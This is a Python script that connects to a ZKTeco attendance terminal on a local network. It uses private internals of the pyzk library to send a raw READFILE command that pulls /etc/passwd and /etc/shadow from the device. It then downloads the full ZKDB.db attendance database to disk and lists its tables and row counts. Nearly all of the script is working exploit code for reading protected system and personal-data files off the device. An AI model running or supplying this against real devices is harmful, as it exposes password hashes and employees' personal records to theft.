#!/usr/bin/env python3
"""Properly consume READFILE data after PREPARE_DATA."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time
from zk import ZK, const
from struct import pack, unpack

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def read_zkdb_from_sock(sock, timeout_s=15):
    """After receiving PREPARE_DATA, the device sends data chunks."""
    data = b''
    sock.settimeout(timeout_s)
    chunks = 0
    while True:
        try:
            chunk = sock.recv(65536)
            if not chunk:
                break
            # Each chunk: top header (8) + ZK header (8) + data
            if len(chunk) < 16:
                continue
            top1, top2, tcp_len = unpack('<HHI', chunk[:8])
            zk_cmd, _, _, _ = unpack('<HHHH', chunk[8:16])
            body = chunk[16:16+(tcp_len - 8)]
            data += body
            chunks += 1
            print('    Chunk #{}: cmd=0x{:04X} tcp_len={} body_len={}'.format(chunks, zk_cmd, tcp_len, len(body)))
            if zk_cmd == const.CMD_ACK_OK:
                print('    [DONE] Got ACK_OK')
                break
            if zk_cmd == 0x07D0:
                # CMD_ACK_OK
                break
        except socket.timeout:
            print('    [TIMEOUT]')
            break
        except Exception as e:
            print('    [ERR]', e)
            break
    return data

zk = ZK('172.16.0.214', port=4370, timeout=15, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    conn.disable_device()
except: pass

sock = conn._ZK__sock
session_id = conn._ZK__session_id

# Read /etc/passwd with proper handshake
print('\n=== READFILE /etc/passwd ===')
r = send_cmd(conn, 0x6A6, b'/etc/passwd\x00')
print('Initial:', r)
if r.get('status') or r.get('code') == 1500:
    data = read_zkdb_from_sock(sock, timeout_s=8)
    print('Total data:', len(data), 'bytes')
    print('Content:')
    print(data.decode('ascii', errors='replace'))

# Read /etc/shadow
print('\n=== READFILE /etc/shadow ===')
r = send_cmd(conn, 0x6A6, b'/etc/shadow\x00')
print('Initial:', r)
if r.get('status') or r.get('code') == 1500 or r.get('code') == 1501:
    data = read_zkdb_from_sock(sock, timeout_s=8)
    print('Total data:', len(data), 'bytes')
    if data:
        print('Content (first 1000):')
        print(data.decode('ascii', errors='replace')[:1000])

# Read /mnt/mtdblock/data/ZKDB.db
print('\n=== READFILE ZKDB.db (full DB) ===')
r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/ZKDB.db\x00')
print('Initial:', r)
if r.get('status') or r.get('code') == 1500:
    data = read_zkdb_from_sock(sock, timeout_s=30)
    print('Total data:', len(data), 'bytes')
    if len(data) > 100:
        out = 'D:\\chamcong\\zk_remote_full_zkdb_' + str(int(time.time())) + '.db'
        with open(out, 'wb') as f:
            f.write(data)
        print('[SAVED]', out)
        print('First 16 bytes:', data[:16])
        # Check SQLite magic
        if data[:15] == b'SQLite format 3':
            print('[VALID] SQLite database!')
            # Open and count rows
            import sqlite3
            try:
                # Save as temp file
                tmp = 'D:\\chamcong\\tmp_verify.db'
                with open(tmp, 'wb') as f:
                    f.write(data)
                db = sqlite3.connect(tmp)
                cur = db.cursor()
                cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
                tables = [r[0] for r in cur.fetchall()]
                print('Tables:', tables)
                for t in tables:
                    cur.execute('SELECT COUNT(*) FROM "' + t + '"')
                    cnt = cur.fetchone()[0]
                    print('  {}: {} rows'.format(t, cnt))
                db.close()
            except Exception as e:
                print('SQLite open error:', e)

try:
    conn.enable_device()
except: pass
try:
    conn.disconnect()
except: pass
print('\n[+] Done')
